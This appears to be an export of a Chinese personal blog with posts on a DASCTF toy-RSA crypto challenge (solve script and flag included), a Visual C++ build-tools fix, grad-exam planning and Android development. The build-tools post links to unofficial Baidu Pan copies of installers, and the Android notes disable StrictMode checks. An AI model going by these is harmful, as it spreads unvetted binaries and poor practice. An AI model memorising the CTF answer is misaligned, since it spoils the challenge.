max = Math.max(max, end - start + <span class="number">1</span>);</span><br><span class="line">map.put(ch, end);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 杂七杂八 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python安装包时报错Microsoft-Visual-C++-14.0-is-required解决方法</title>
      <link href="/2022/04/23/python%E5%AE%89%E8%A3%85%E5%8C%85%E6%97%B6%E6%8A%A5%E9%94%99Microsoft-Visual-C-14-0-is-required%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2022/04/23/python%E5%AE%89%E8%A3%85%E5%8C%85%E6%97%B6%E6%8A%A5%E9%94%99Microsoft-Visual-C-14-0-is-required%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><p>今天装pycryptodome包的时候报了一个错误，错误信息里面有下面的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: Microsoft Visual C++ 14.0 is required. Get it with &quot;Build Tools for Visual Studio&quot;: https://visualstudio.microsoft.com/downloads/ Tools&quot;:</span><br></pre></td></tr></table></figure><p>缺少编译环境的意思似乎是，这就要安装这个环境来解决了，我主要是参考的下面这篇文章解决的：</p><p>[1]. <a href="https://zhuanlan.zhihu.com/p/126669852">Microsoft Visual C++ 14.0 is required解决方法</a>. <a href="https://www.zhihu.com/people/panda-9-6">HUST潘潘</a>. 2022-01-13</p><p>然后先下载他给出的<a href="https://pan.baidu.com/s/1-VTGzPA-RS6eIIqgiRO4yg">Microsoft Visual C++ Build Tools.exe</a></p><p>还有他给出的<a href="https://pan.baidu.com/s/1ytKIVSBXLMQhrXleC_I4dA?pwd=8scp">solved_packageMissInInstalling_mu_visual_cpp_build_tools_2015_update_3_x64_dvd_dfd9a39c.iso</a></p><p>然后运行第一个程序，之后或许会遇到网络错误的情况。这是加载第二个文件里面的一些东西，需要什么就加载什么即可。点击第二个文件的话，好像是会出现一个驱动器，需要加载的文件就在这个驱动器里面，直接从上面的文件夹一个一个试也可以，加载完成之后就可以正常安装之前安装报错的库了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂七杂八 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022DASCTF_Apr_X_FATE_防疫挑战赛</title>
      <link href="/2022/04/23/2022DASCTF-Apr-X-FATE-%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2022/04/23/2022DASCTF-Apr-X-FATE-%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easy-real"><a href="#easy-real" class="headerlink" title="easy_real"></a>easy_real</h3><p>题目代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">key = random.randint(<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    crypto += <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i])^key)</span><br><span class="line">m = crypto的<span class="built_in">ascii</span>十六进制</span><br><span class="line">e = random.randint(<span class="number">1</span>,<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(hashlib.md5(e))</span><br><span class="line">p = <span class="number">64310413306776406422334034047152581900365687374336418863191177338901198608319</span></span><br><span class="line">q = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment">#37693cfc748049e45d87b8c7d8b9aacd</span></span><br><span class="line"><span class="comment">#4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523</span></span><br><span class="line"><span class="comment">#3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397</span></span><br></pre></td></tr></table></figure><p>签到题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hashe = <span class="string">&#x27;37693cfc748049e45d87b8c7d8b9aacd&#x27;</span></span><br><span class="line">n = <span class="number">4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523</span></span><br><span class="line">c = <span class="number">3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397</span></span><br><span class="line">p = <span class="number">64310413306776406422334034047152581900365687374336418863191177338901198608319</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(random.randint(1, 100))</span></span><br><span class="line">q = n // p</span><br><span class="line"><span class="keyword">assert</span> p * q == n</span><br><span class="line"></span><br><span class="line"><span class="comment"># crash e value</span></span><br><span class="line">e = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(<span class="built_in">str</span>(i).encode()).hexdigest() == hashe:</span><br><span class="line">        e = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># decode RSA, to get the middle m</span></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">m = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Crash key to get the flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(m[i] ^ key)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;W31coM3_C0m3_7o_f4T3ctf&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-asset-image插件问题</title>
      <link href="/2022/04/22/hexo-asset-image%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98/"/>
      <url>/2022/04/22/hexo-asset-image%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="hexo-asset-image-插件问题"><a href="#hexo-asset-image-插件问题" class="headerlink" title="hexo-asset-image 插件问题"></a>hexo-asset-image 插件问题</h3><p>今天部署的时候出现了一些问题，主要就是hexo的版本更新了，但是 hexo-asset-image 这个插件更新的太慢了，作者已经不太维护这个小工具了，问题的主要内容为，generate的时候出现下面的情况:</p><blockquote><p>update link as:–&gt;&#x2F;.io&#x2F;&#x2F;image-20211020114103929.png</p></blockquote><p>这是插件的代码兼容性太差(或者说是hexo更新地太快了？)，需要更新插件的index.js的第24行代码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var endPos = link.length;</span><br></pre></td></tr></table></figure><p>之后就好了，部署的图片已经可以看得到了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo插件问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站运营</title>
      <link href="/2022/01/16/%E7%BD%91%E7%AB%99%E8%BF%90%E8%90%A5/"/>
      <url>/2022/01/16/%E7%BD%91%E7%AB%99%E8%BF%90%E8%90%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从今天开始，我决定花一部分时间搞网站运营，只需要把每天的时间抽出来一部分用来运营就差不多了应该，每天一个小时的时间应该还是可以抽出来的。</p><h2 id="前景估计"><a href="#前景估计" class="headerlink" title="前景估计"></a>前景估计</h2><p>网站运营差不多是从世纪初开始出现的事物吧，估计下一个10年里面，如果不出现重大的科技改革的话，网站运营应该都是比较有做头的东西，可以搞搞看看。走一步看一步吧!</p><h1 id="博客网站运营"><a href="#博客网站运营" class="headerlink" title="博客网站运营"></a>博客网站运营</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><h3 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h3><p>这个网站用来写文章、发文章、写随笔，写的东西发布到博客空间里面。可以象征性的在网站加点广告，尝试一下能不能获得一些收入，毕竟每年买服务器玩，买了服务器又不用就白瞎了啊，不如整点广告(去码头整点薯条)。但是添加广告不能整个让访客非常难受的，不能做到让别人喜欢，但是起码要做到不能让别人厌恶。</p><p>博客网站的大部分的内容会是我的原创文章，因为我比较喜欢打字嘿嘿。</p><p>感觉内容写点报错的解决方法，或者说是工具的使用方法的话，也许访问的人数会多一点。</p><h3 id="之后的事"><a href="#之后的事" class="headerlink" title="之后的事"></a>之后的事</h3><p>之后除了这个博客的这个网站，可能还会搞搞其他的，网页小游戏之类的(打个比方)</p><h2 id="网站搭建"><a href="#网站搭建" class="headerlink" title="网站搭建"></a>网站搭建</h2><h3 id="购买服务器"><a href="#购买服务器" class="headerlink" title="购买服务器"></a>购买服务器</h3><p>首先啊，就是这个买服务器的问题，我本人只使用过腾讯云和阿里云的服务器。而目前我使用的是阿里云的服务器，我想未来很长的一段时间我都会一直使用阿里的服务器。还有就是域名的问题，域名解析的话续费也不是很贵，但是第一年我会尽量不续费，尝试一下看看是不是会有丢失访客的现象出现。</p><h3 id="搭建WordPress网站"><a href="#搭建WordPress网站" class="headerlink" title="搭建WordPress网站"></a>搭建WordPress网站</h3><p>之前也使用过一段时间的wordpress，感觉这个功能复杂，功能越复杂我的可操作性也越大，到时候保存自己的文章什么的也挺方便的应该。</p><p>搭建网站的方式呢，我不是特别推荐docker的形式搭建，之前就是docker劝退的，docker看起来很简洁，但是可维护性对于我这种傻逼来说有点差，所以我决定暂时直接使用我的轻量型。</p><h3 id="搭建一个普通的wordpress环境"><a href="#搭建一个普通的wordpress环境" class="headerlink" title="搭建一个普通的wordpress环境"></a>搭建一个普通的wordpress环境</h3><p>本来还准备手动搭建一个，但是直接充值系统就有了，那就直接重置了。</p><p><img src="/2022/01/16/%E7%BD%91%E7%AB%99%E8%BF%90%E8%90%A5//image-20220117000105417.png"></p><p>简单试了一下，是可以使用的哈</p><p><img src="/2022/01/16/%E7%BD%91%E7%AB%99%E8%BF%90%E8%90%A5//image-20220117001807255.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>考研总刊</title>
      <link href="/2022/01/11/%E8%80%83%E7%A0%94%E6%80%BB%E5%88%8A/"/>
      <url>/2022/01/11/%E8%80%83%E7%A0%94%E6%80%BB%E5%88%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="考研——准备篇"><a href="#考研——准备篇" class="headerlink" title="考研——准备篇"></a>考研——准备篇</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>现在是2022年1月11日，而考研的时间一般都是在十二月份的下旬，已经剩下不到12个月的时间了，大约11个月吧。今天的任务主要是整理一下关于考研的相关知识。</p><p>说到考研，其实我知之甚少，我甚至不知道他的这个考试的模式与报名的规则，那今天正好复习资料还没买，先整理一下这个关于考研我需要知道的一些东西。</p><h3 id="考研统考"><a href="#考研统考" class="headerlink" title="考研统考"></a>考研统考</h3><p>一般学校考研招生都是通过统考来的，其中因为我是计算机学科，所以我统考要考的内容大致是下面的几门</p><p><strong>计算机统考</strong></p><p>考试科目：思想政治理论、外国语、数学一、<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%A6%E7%A7%91%E4%B8%93%E4%B8%9A%E5%9F%BA%E7%A1%80%E7%BB%BC%E5%90%88">计算机学科专业基础综合</a>（数据结构45分、<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86">计算机组成原理</a>45分、操作系统35分和计算机网络25分等学科）。卷面分值分别为：100、100、150、150。</p><p>满分是500，这里考400分就相当于高考时的600分了，那我大致的目标就是<code>350～400</code>分之间。</p><h3 id="统考报名、志愿填报"><a href="#统考报名、志愿填报" class="headerlink" title="统考报名、志愿填报"></a>统考报名、志愿填报</h3><p>考研的志愿填报时在考试前进行的，一般每年10月份考研报名，报名时就要选择报考单位、报考专业和考试科目。</p><blockquote><p>而报名的时候能填写的所要报名的院校只能有一个，所谓的第二、第三志愿是在初试成绩出来之后再做的选择。考研的志愿填报时在考试前进行的，一般每年10月份考研报名，报名时就要选择报考单位报考专业和考试科目。</p></blockquote><p>所以一般第一志愿就是你的意愿比较强的目标，比如说我的目标之一，北京理工大学</p><p><img src="/2022/01/11/%E8%80%83%E7%A0%94%E6%80%BB%E5%88%8A//image-20220111163129948.png" alt="北京理工大学"></p><p>上面的分数线就是最基本的分数线，就是没这个分数一般情况下是进不了复试的，进了复试之后更是疯狂刷人的独木桥。但是我的成绩太差了，估计有很大可能要寄，因为近年来考研的人也越来越多了，分数线也跟着噌噌地涨，我感觉我的实力最多就是到西电的分数那个样子，所以我的目标应该就是西安电子科技大学。如果复习的好的话，可能两电一邮不是梦(嘿嘿，意淫中)。</p><h3 id="初期远大目标"><a href="#初期远大目标" class="headerlink" title="初期远大目标"></a>初期远大目标</h3><p><strong>两电一邮、国科大、郑大</strong></p><p>按到十月份的复习成果到时候选择报名那个层次，人最重要的就是要保持梦想，尽管我感觉两电一邮很遥远，可总是要试试才知道。</p><p>目标：211、计算机、学硕</p><h3 id="复习计划"><a href="#复习计划" class="headerlink" title="复习计划"></a>复习计划</h3><p>先要复习数学，然后是政治英语，最后是专业课，其中英语单词的背诵需要穿插到每天的复习之中。毕竟学英语是一辈子的事情。数学的话开始准备看汤家凤的课，跟着学，准备数学一。</p><blockquote><p>1月13 ～：复习数学一</p></blockquote><h2 id="考研——数学一"><a href="#考研——数学一" class="headerlink" title="考研——数学一"></a>考研——数学一</h2><h3 id="高数"><a href="#高数" class="headerlink" title="高数"></a>高数</h3>]]></content>
      
      
      
        <tags>
            
            <tag> 考研 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓开发经验贴</title>
      <link href="/2022/01/09/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C%E8%B4%B4/"/>
      <url>/2022/01/09/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C%E8%B4%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>初学一门语言、一种新的编程方法，一定要多做笔记，这样将来忘记的时候，还能重新回来看看当初这个问题自己是怎么解决的。下面写的都是最近做安卓开发的时候遇到的一些问题与相应的解决办法。</p><h2 id="开发实例——音乐软件开发"><a href="#开发实例——音乐软件开发" class="headerlink" title="开发实例——音乐软件开发"></a>开发实例——音乐软件开发</h2><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><p>实在没什么好的想法了，这个东西是问了别人之后才有的思路，感觉可以整整打发打发时间，所以就整了。</p><h3 id="实现底部菜单"><a href="#实现底部菜单" class="headerlink" title="实现底部菜单"></a>实现底部菜单</h3><p>直接使用AS上自带的模板，就是Home、Dashboard、Infomation那个，然后把图片换换就行了。</p><p><img src="/2022/01/09/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C%E8%B4%B4//image-20220109192059632.png"></p><p>换图片的名字的话，需要在menu文件夹下面的那个<code>bottom_nav_menu.xml</code>文件里面做修改。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;menu xmlns:android=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span><br><span class="line">    &lt;item</span><br><span class="line">        android:id=<span class="string">&quot;@+id/navigation_home&quot;</span></span><br><span class="line">        android:icon=<span class="string">&quot;@drawable/bottom_menu_index&quot;</span></span><br><span class="line">        android:title=<span class="string">&quot;@string/title_home&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;item</span><br><span class="line">        android:id=<span class="string">&quot;@+id/navigation_dashboard&quot;</span></span><br><span class="line">        android:icon=<span class="string">&quot;@drawable/bottom_menu_setup&quot;</span></span><br><span class="line">        android:title=<span class="string">&quot;@string/title_dashboard&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;item</span><br><span class="line">        android:id=<span class="string">&quot;@+id/navigation_notifications&quot;</span></span><br><span class="line">        android:icon=<span class="string">&quot;@drawable/bottom_menu_aboutme&quot;</span></span><br><span class="line">        android:title=<span class="string">&quot;@string/title_notifications&quot;</span> /&gt;</span><br><span class="line">&lt;/menu&gt;</span><br></pre></td></tr></table></figure><h3 id="实现-我的-界面"><a href="#实现-我的-界面" class="headerlink" title="实现 我的 界面"></a>实现 我的 界面</h3><p>我的界面需要登录，这里我采用的还是原来做软件工程的那个api，那里正好也有个登录的功能，正好拿到这里用。</p><h4 id="1-HttpURLConnection实现网络请求"><a href="#1-HttpURLConnection实现网络请求" class="headerlink" title="1.HttpURLConnection实现网络请求"></a>1.<strong>HttpURLConnection</strong>实现网络请求</h4><blockquote><p><a href="https://www.jb51.net/article/153286.htm">参考内容</a></p></blockquote><h5 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h5><p>安卓不能在主线程中进行网络请求，想进行网络请求必须另开一个单独的线程，或者使用其他的标记。</p><blockquote><p><a href="https://blog.csdn.net/yuan882696yan/article/details/38419219">android下的android.os.StrictMode$AndroidBlockGuardPolicy.onNetwork错误</a></p></blockquote><p>我用的上面的这个老哥的第一种解决方案，我的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@TargetApi(Build.VERSION_CODES.GINGERBREAD)</span></span><br><span class="line"><span class="meta">@SuppressLint(&quot;NewApi&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">basic</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">Basicurl</span> <span class="operator">=</span> <span class="string">&quot;http://121.5.227.164:3000&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">doGet</span><span class="params">(String param)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        StrictMode.ThreadPolicy policy=<span class="keyword">new</span> <span class="title class_">StrictMode</span>.ThreadPolicy.Builder().permitAll().build();</span><br><span class="line">        StrictMode.setThreadPolicy(policy);</span><br></pre></td></tr></table></figure><p>差不多该成上面的这样就ok了，那两个@的位置倒是可以随便挪。<code>@TargetApi(Build.VERSION_CODES.GINGERBREAD) @SuppressLint(&quot;NewApi&quot;)</code>、<code>StrictMode.ThreadPolicy policy=new StrictMode.ThreadPolicy.Builder().permitAll().build(); StrictMode.setThreadPolicy(policy);</code></p><h5 id="添加网络权限"><a href="#添加网络权限" class="headerlink" title="添加网络权限"></a>添加网络权限</h5><p>在<code>AndroidManifest.xml</code>文件中加入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h5 id="Get方法实现"><a href="#Get方法实现" class="headerlink" title="Get方法实现"></a>Get方法实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1. URL</span></span><br><span class="line">  <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://image.baidu.com/search/index?tn=baiduimage&amp;ipn=r&amp;ct=201326592&amp;cl=2&amp;lm=-1&amp;st=-1&amp;fm=index&amp;fr=&amp;sf=1&amp;fmq=&amp;pv=&amp;ic=0&amp;nc=1&amp;z=&amp;se=1&amp;showtab=0&amp;fb=0&amp;width=&amp;height=&amp;face=0&amp;istype=2&amp;ie=utf-8&amp;word=%E5%8A%A8%E6%BC%AB&quot;</span>);</span><br><span class="line">  <span class="comment">//2. HttpURLConnection</span></span><br><span class="line">  HttpURLConnection conn=(HttpURLConnection)url.openConnection();</span><br><span class="line">  <span class="comment">//3. set(GET)</span></span><br><span class="line">  conn.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">  <span class="comment">//4. getInputStream</span></span><br><span class="line">  <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> conn.getInputStream();</span><br><span class="line">  <span class="comment">//5. 解析is，获取responseText，这里用缓冲字符流</span></span><br><span class="line">  <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line">  <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">  <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">while</span>((line=reader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">    sb.append(line);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//获取响应文本</span></span><br><span class="line">  <span class="type">String</span> <span class="variable">responseText</span> <span class="operator">=</span> sb.toString();</span><br></pre></td></tr></table></figure><h5 id="Post方法实现"><a href="#Post方法实现" class="headerlink" title="Post方法实现"></a>Post方法实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1. URL</span></span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://image.baidu.com/search/index&quot;</span>);</span><br><span class="line">    <span class="comment">//2. HttpURLConnection</span></span><br><span class="line">    <span class="type">HttpURLConnection</span> <span class="variable">conn</span> <span class="operator">=</span> (HttpURLConnection)url.openConnection();</span><br><span class="line">    <span class="comment">//3. POST</span></span><br><span class="line">    conn.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">    <span class="comment">//4. Content-Type,这里是固定写法，发送内容的类型</span></span><br><span class="line">    conn.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">    <span class="comment">//5. output，这里要记得开启输出流，将自己要添加的参数用这个输出流写进去，传给服务端，这是socket的基本结构</span></span><br><span class="line">    conn.setDoOutput(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> conn.getOutputStream();</span><br><span class="line">    <span class="type">String</span> <span class="variable">param</span> <span class="operator">=</span> <span class="string">&quot;tn=baiduimage&amp;ipn=r&amp;ct=201326592&amp;cl=2&amp;lm=-1&amp;st=-1&amp;fm=index&amp;fr=&amp;sf=1&amp;fmq=&amp;pv=&amp;ic=0&amp;nc=1&amp;z=&amp;se=1&amp;showtab=0&amp;fb=0&amp;width=&amp;height=&amp;face=0&amp;istype=2&amp;ie=utf-8&amp;word=%E5%8A%A8%E6%BC%AB&quot;</span>;</span><br><span class="line">    <span class="comment">//一定要记得将自己的参数转换为字节，编码格式是utf-8</span></span><br><span class="line">    os.write(param.getBytes(<span class="string">&quot;utf-8&quot;</span>));</span><br><span class="line">    os.flush();</span><br><span class="line">    <span class="comment">//6. is</span></span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> conn.getInputStream();</span><br><span class="line">    <span class="comment">//7. 解析is，获取responseText</span></span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span>((line=reader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">      sb.append(line);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取响应文本</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">responseText</span> <span class="operator">=</span> sb.toString();</span><br></pre></td></tr></table></figure><p>这里如果需要上传的有参数的话，可以直接使用拼接的方法，拼到基础的url的后面即可</p><h3 id="实现-主页-界面"><a href="#实现-主页-界面" class="headerlink" title="实现 主页 界面"></a>实现 主页 界面</h3><p>本来这个安卓的界面是不能向下继续划的，要实现这种效果就要使用这个ScrollView控件了，但是这个控件下面只能包含一个子布局，所以可以在下面使用<code>LinearLayout</code>，- 明天再实现 -</p><h4 id="1-ScrollView使用"><a href="#1-ScrollView使用" class="headerlink" 